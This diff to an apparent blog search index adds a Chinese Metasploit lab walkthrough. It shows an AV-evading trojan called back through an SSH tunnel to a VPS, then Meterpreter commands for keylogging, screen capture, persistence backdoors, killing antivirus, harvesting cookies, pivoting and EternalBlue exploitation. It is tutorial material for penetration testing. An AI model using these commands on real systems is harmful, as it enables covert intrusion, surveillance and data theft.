@@ -3,6 +3,111 @@
   
     
     <entry>
+      <title><![CDATA[Metasploit]]></title>
+      <url>/2017/10/08/Metasploit/</url>
+      <content type="html"><![CDATA[<h2 id="0x00-Metasploit-Framework简介"><a href="#0x00-Metasploit-Framework简介" class="headerlink" title="0x00. Metasploit Framework简介"></a>0x00. Metasploit Framework简介</h2><h4 id="emsp-emsp-Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！"><a href="#emsp-emsp-Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！" class="headerlink" title="&emsp;&emsp;Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！"></a>&emsp;&emsp;Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！</h4><a id="more"></a>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/WEBRESOURCE3e65a795a3f7fcac430185b407c010bb/2777" alt="image"></p>
+<hr>
+<h2 id="0x01-实战操作"><a href="#0x01-实战操作" class="headerlink" title="0x01. 实战操作"></a>0x01. 实战操作</h2><h2 id="环境准备："><a href="#环境准备：" class="headerlink" title="环境准备："></a>环境准备：</h2><h4 id="1-靶机win-7-emsp-IP-192-168-43-150"><a href="#1-靶机win-7-emsp-IP-192-168-43-150" class="headerlink" title="1. 靶机win 7 &emsp; IP=192.168.43.150"></a>1. 靶机win 7 &emsp; IP=192.168.43.150</h4><h4 id="2-kali-linux-emsp-IP-192-168-43-153"><a href="#2-kali-linux-emsp-IP-192-168-43-153" class="headerlink" title="2. kali linux &emsp; IP=192.168.43.153"></a>2. kali linux &emsp; IP=192.168.43.153</h4><h4 id="3-VPS服务器-emsp-IP-xx-xx-xx-xx"><a href="#3-VPS服务器-emsp-IP-xx-xx-xx-xx" class="headerlink" title="3. VPS服务器 &emsp; IP=xx.xx.xx.xx"></a>3. VPS服务器 &emsp; IP=xx.xx.xx.xx</h4><h2 id="实战演示："><a href="#实战演示：" class="headerlink" title="实战演示："></a>实战演示：</h2><h3 id="1-先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口"><a href="#1-先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口" class="headerlink" title="1. 先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口"></a>1. 先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口</h3><blockquote>
+<p>ssh -CfNg -R xx.xx.xx.xx:2333:192.168.43.153:2333 root@xx.xx.xx.xx -p 29402</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/B0A29DC18557456A8233E113B2E545A7/2805" alt="image"></p>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/CE26F3A8040346ABAB760ECE9324382F/2786" alt="image"></p>
+<h3 id="2-启动kali设置msf监听，lport-2333，lhost-192-168-43-153-注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个系列文章"><a href="#2-启动kali设置msf监听，lport-2333，lhost-192-168-43-153-注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个系列文章" class="headerlink" title="2. 启动kali设置msf监听，lport=2333，lhost=192.168.43.153(注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个系列文章"></a>2. 启动kali设置msf监听，lport=2333，lhost=192.168.43.153(注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个<a href="http://www.freebuf.com/sectool/67674.html" target="_blank" rel="external">系列文章</a></h3><p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/9CD797025E3C4F73B6249F645BFB89A9/2796" alt="image"></p>
+<h3 id="3-在win-7-中执行木马，同时使用SSH命令将VPS中的2333端口映射到本地kali的2333端口（在实战中自己常常在内网，所以这里介绍一下VPS）"><a href="#3-在win-7-中执行木马，同时使用SSH命令将VPS中的2333端口映射到本地kali的2333端口（在实战中自己常常在内网，所以这里介绍一下VPS）" class="headerlink" title="3. 在win 7 中执行木马，同时使用SSH命令将VPS中的2333端口映射到本地kali的2333端口（在实战中自己常常在内网，所以这里介绍一下VPS）"></a>3. 在win 7 中执行木马，同时使用SSH命令将VPS中的2333端口映射到本地kali的2333端口（在实战中自己常常在内网，所以这里介绍一下VPS）</h3><p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/5A6F7DAC4D274B64A4CFD66B0080B835/2803" alt="image"></p>
+<h3 id="4-接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win-7的桌面进程"><a href="#4-接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win-7的桌面进程" class="headerlink" title="4. 接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win 7的桌面进程"></a>4. 接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win 7的桌面进程</h3><blockquote>
+<p>migrate 1988 &amp;&amp; getpid</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/6F701A71ADC74D9886456ACAD234579A/2807" alt="image"></p>
+<h3 id="5-查看当前权限、系统信息，并尝试提权"><a href="#5-查看当前权限、系统信息，并尝试提权" class="headerlink" title="5. 查看当前权限、系统信息，并尝试提权"></a>5. 查看当前权限、系统信息，并尝试提权</h3><blockquote>
+<p>getuid &amp;&amp; sysinfo &amp;&amp; getsystem</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/E4A2C214EB80482099D8EC2FAD4EAD5B/2809" alt="image"></p>
+<h3 id="6-查看网络、路由信息"><a href="#6-查看网络、路由信息" class="headerlink" title="6. 查看网络、路由信息"></a>6. 查看网络、路由信息</h3><blockquote>
+<p>ifconfig &amp;&amp; route</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/6952617E2F0C487D9961361455423D8F/2811" alt="image"></p>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/7BD2DDFFF9C34C97BCC4B83CBBCE460F/2813" alt="image"></p>
+<h3 id="7-监视靶机的桌面"><a href="#7-监视靶机的桌面" class="headerlink" title="7. 监视靶机的桌面"></a>7. 监视靶机的桌面</h3><blockquote>
+<p>run vnc</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/1341936A33D348D9BFA015BD4152A84B/2815" alt="image"></p>
+<h3 id="8-启动键盘监听"><a href="#8-启动键盘监听" class="headerlink" title="8. 启动键盘监听"></a>8. 启动键盘监听</h3><blockquote>
+<p>keyscan_start &amp;&amp; keyscan_dump</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/1048F53C0DB74D29B1966D4DAEFB375C/2817" alt="image"></p>
+<h3 id="9-设置后门，维持权限"><a href="#9-设置后门，维持权限" class="headerlink" title="9. 设置后门，维持权限"></a>9. 设置后门，维持权限</h3><blockquote>
+<p>run persistence -U -i 10 -p 2333&emsp;192.168.43.153</p>
+<p>run persistence -X -i 10 -p 2333&emsp;192.168.43.153</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/4F1F527B74624DB293B3BA98A14B655B/2819" alt="image"></p>
+<h3 id="10-截屏查看靶机当前桌面"><a href="#10-截屏查看靶机当前桌面" class="headerlink" title="10. 截屏查看靶机当前桌面"></a>10. 截屏查看靶机当前桌面</h3><blockquote>
+<p>screenshot</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/6AA05CFBB24A4F58B4B4073C76EA86E7/2821" alt="image"></p>
+<h3 id="11-查看当前系统空闲时间"><a href="#11-查看当前系统空闲时间" class="headerlink" title="11. 查看当前系统空闲时间"></a>11. 查看当前系统空闲时间</h3><blockquote>
+<p>idletime</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/79CB8D02C9DE4A5AA6B59C8064C0406B/2823" alt="image"></p>
+<h3 id="12-禁用靶机使用键盘鼠标（笔者win-7系统是64位的，不支持这个操作）"><a href="#12-禁用靶机使用键盘鼠标（笔者win-7系统是64位的，不支持这个操作）" class="headerlink" title="12. 禁用靶机使用键盘鼠标（笔者win 7系统是64位的，不支持这个操作）"></a>12. 禁用靶机使用键盘鼠标（笔者win 7系统是64位的，不支持这个操作）</h3><blockquote>
+<p>uictl disable keyboard</p>
+<p>uictl disable mouse</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/1153DFFD1E3E45148071B6547CF0CB28/2825" alt="image"></p>
+<h3 id="13-查找靶机中重要的敏感文件"><a href="#13-查找靶机中重要的敏感文件" class="headerlink" title="13. 查找靶机中重要的敏感文件"></a>13. 查找靶机中重要的敏感文件</h3><blockquote>
+<p>search -d c:\\ -f payload.exe</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/7FA2C1C2A0F9495D853E8DBE84F3F921/2829" alt="image"></p>
+<h3 id="14-指定下载靶机中的文件到本地"><a href="#14-指定下载靶机中的文件到本地" class="headerlink" title="14. 指定下载靶机中的文件到本地"></a>14. 指定下载靶机中的文件到本地</h3><blockquote>
+<p>dowmload&emsp;c:\\Users\\root\\Desktop\\payload.exe&emsp;/root/Desktop</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/D64579685D6946E0A1778127C2DC0C89/2831" alt="image"></p>
+<h3 id="15-上传指定本地文件到靶机中"><a href="#15-上传指定本地文件到靶机中" class="headerlink" title="15. 上传指定本地文件到靶机中"></a>15. 上传指定本地文件到靶机中</h3><blockquote>
+<p>upload&emsp;/root/Desktop/hack.jpeg&emsp;c:\\Users\\root\\Desktop\\payload.exe</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/590D4B293166484BB1B80C740B766889/2833" alt="image"></p>
+<h3 id="16-打开靶机摄像头，win-7没有虚拟机所以没反应"><a href="#16-打开靶机摄像头，win-7没有虚拟机所以没反应" class="headerlink" title="16. 打开靶机摄像头，win 7没有虚拟机所以没反应"></a>16. 打开靶机摄像头，win 7没有虚拟机所以没反应</h3><blockquote>
+<p>webcam_snap</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/30AFC5056C0C488CAC1B401A54657300/2835" alt="image"></p>
+<hr>
+<h1 id="0x02-后渗透测试"><a href="#0x02-后渗透测试" class="headerlink" title="0x02. 后渗透测试"></a>0x02. 后渗透测试</h1><h3 id="1-调用post模块查看当前系统可用的提权模块"><a href="#1-调用post模块查看当前系统可用的提权模块" class="headerlink" title="1. 调用post模块查看当前系统可用的提权模块"></a>1. 调用post模块查看当前系统可用的提权模块</h3><blockquote>
+<p>run post/multi/recon/local_exploit_suggester</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/062DCEF953D0483885263D3B68EA6500/2837" alt="image"></p>
+<h3 id="2-调用payload模块对靶机进行远程桌面操作"><a href="#2-调用payload模块对靶机进行远程桌面操作" class="headerlink" title="2. 调用payload模块对靶机进行远程桌面操作"></a>2. 调用payload模块对靶机进行远程桌面操作</h3><blockquote>
+<p>set payload windows/vncinject/reverse_tcp</p>
+<p>set viewonly no </p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/24C3AE7DA38B47D38AD244E1A85412BD/2839" alt="image"></p>
+<h3 id="3-关掉靶机中的杀软"><a href="#3-关掉靶机中的杀软" class="headerlink" title="3. 关掉靶机中的杀软"></a>3. 关掉靶机中的杀软</h3><blockquote>
+<p>killav</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/98E2F5E758294B1D99BE113B0CDAD0F3/2841" alt="image"></p>
+<h3 id="4-收集靶机浏览器的敏感信息-访问记录、cookie"><a href="#4-收集靶机浏览器的敏感信息-访问记录、cookie" class="headerlink" title="4. 收集靶机浏览器的敏感信息(访问记录、cookie)"></a>4. 收集靶机浏览器的敏感信息(访问记录、cookie)</h3><blockquote>
+<p>run post/windows/gather/enum_ie</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/C1568F9B9B8746F990D13D51A9BE3367/2843" alt="image"></p>
+<h3 id="5-设置路由转发，扫描内网机器开放的端口-route-emsp-add-emsp-靶机IP-emsp-子网掩码-emsp-sessions"><a href="#5-设置路由转发，扫描内网机器开放的端口-route-emsp-add-emsp-靶机IP-emsp-子网掩码-emsp-sessions" class="headerlink" title="5. 设置路由转发，扫描内网机器开放的端口(route&emsp;add&emsp;靶机IP&emsp;子网掩码&emsp;sessions)"></a>5. 设置路由转发，扫描内网机器开放的端口(route&emsp;add&emsp;靶机IP&emsp;子网掩码&emsp;sessions)</h3><blockquote>
+<p>route add 92.168.43.150 255.255.255.0 3</p>
+<p>use auxiliary/scanner/portscan/tcp</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/CE904338A187447E9E4C6EB5627C3F3E/2847" alt="image"></p>
+<h3 id="6-扫描一波内网有没有ms17-010漏洞的主机"><a href="#6-扫描一波内网有没有ms17-010漏洞的主机" class="headerlink" title="6. 扫描一波内网有没有ms17_010漏洞的主机"></a>6. 扫描一波内网有没有ms17_010漏洞的主机</h3><blockquote>
+<p>use auxiliary/scanner/smb/smb_ms17_010</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/935810641BBC43FF8EB483C0AD4A2343/2849" alt="image"></p>
+<h3 id="7-笔者扫到win-7就有这个漏洞，然后就愉快的调用exp搞一波"><a href="#7-笔者扫到win-7就有这个漏洞，然后就愉快的调用exp搞一波" class="headerlink" title="7. 笔者扫到win 7就有这个漏洞，然后就愉快的调用exp搞一波"></a>7. 笔者扫到win 7就有这个漏洞，然后就愉快的调用exp搞一波</h3><blockquote>
+<p>use exploit/windows/smb/ms17_010_eternalblue</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/C4989785A16647D4883A6E243CA78443/2851" alt="image"></p>
+<hr>
+<h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="emsp-emsp-msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！"><a href="#emsp-emsp-msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！" class="headerlink" title="&emsp;&emsp;msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！"></a>&emsp;&emsp;msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！</h4>]]></content>
+      
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[MITMF]]></title>
       <url>/2017/10/02/MITMF/</url>
       <content type="html"><![CDATA[<h2 id="0x00-MITMF简介"><a href="#0x00-MITMF简介" class="headerlink" title="0x00. MITMF简介"></a>0x00. MITMF简介</h2><h4 id="emsp-emsp-MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。"><a href="#emsp-emsp-MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。" class="headerlink" title="&emsp;&emsp;MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。"></a>&emsp;&emsp;MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。</h4><a id="more"></a>
